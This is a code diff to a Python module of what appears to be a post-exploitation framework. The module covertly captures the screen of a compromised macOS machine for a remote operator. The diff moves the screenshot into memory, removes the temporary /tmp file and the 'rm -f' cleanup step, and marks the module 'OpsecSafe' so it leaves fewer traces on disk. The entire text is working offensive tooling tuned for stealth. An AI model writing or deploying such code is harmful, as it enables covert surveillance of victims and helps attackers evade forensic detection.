@@ -23,7 +23,7 @@ class Module:
             'NeedsAdmin': False,
 
             # True if the method doesn't touch disk/is reasonably opsec safe
-            'OpsecSafe': False,
+            'OpsecSafe': True,
 
             # the module language
             'Language' : 'python',
@@ -44,11 +44,6 @@ class Module:
                 'Description'   :   'Agent to execute module on.',
                 'Required'      :   True,
                 'Value'         :   ''
-            },
-            'SavePath': {
-                'Description'   :   'Path of the temporary screenshot file to save.',
-                'Required'      :   True,
-                'Value'         :   '/tmp/out.png'
             }
         }
 
@@ -69,37 +64,27 @@ class Module:
 
     def generate(self):
 
-        savePath = self.options['SavePath']['Value']
-
         script = """
-import Foundation
-import Quartz
-import Quartz.CoreGraphics as CG
-from Cocoa import NSURL
-import LaunchServices
+try:
+    import Foundation
+    import Quartz
+    import Quartz.CoreGraphics as CG
+    import LaunchServices
+    from AppKit import *
+    import binascii
+except ImportError:
+    print "Missing required module..."
 
-region = CG.CGRectInfinite
-path = '%s'
-image = CG.CGWindowListCreateImage(region, CG.kCGWindowListOptionOnScreenOnly, CG.kCGNullWindowID, CG.kCGWindowImageDefault)
-imagepath = NSURL.fileURLWithPath_(path)
-dest = Quartz.CGImageDestinationCreateWithURL(
-    imagepath,
-    LaunchServices.kUTTypePNG,
-    1,
-    None)
-properties = {
-    Quartz.kCGImagePropertyDPIWidth: 1024,
-    Quartz.kCGImagePropertyDPIHeight: 720,
-}
-
-Quartz.CGImageDestinationAddImage(dest, image, properties)
-Quartz.CGImageDestinationFinalize(dest)
-
-f = open(path, 'rb')
-data = f.read()
-f.close()
-run_command('rm -f %s')
-print data
-""" % (savePath, savePath)
+onScreenWindows = CG.CGWindowListCreate(CG.kCGWindowListOptionOnScreenOnly, CG.kCGNullWindowID)
+desktopElements = Foundation.CFArrayCreateMutableCopy(None, 0, onScreenWindows)
+imageRef = CG.CGWindowListCreateImageFromArray(CG.CGRectInfinite, desktopElements, CG.kCGWindowListOptionAll)
+rep = NSBitmapImageRep.alloc().initWithCGImage_(imageRef)
+props = NSDictionary()
+imageData = rep.representationUsingType_properties_(NSPNGFileType,props)
+imageString = str(imageData).strip('<').strip('>>').strip('native-selector bytes of')
+hexstring = binascii.hexlify(imageString)
+hex_data = hexstring.decode('hex')
+print hex_data
+"""
 
         return script
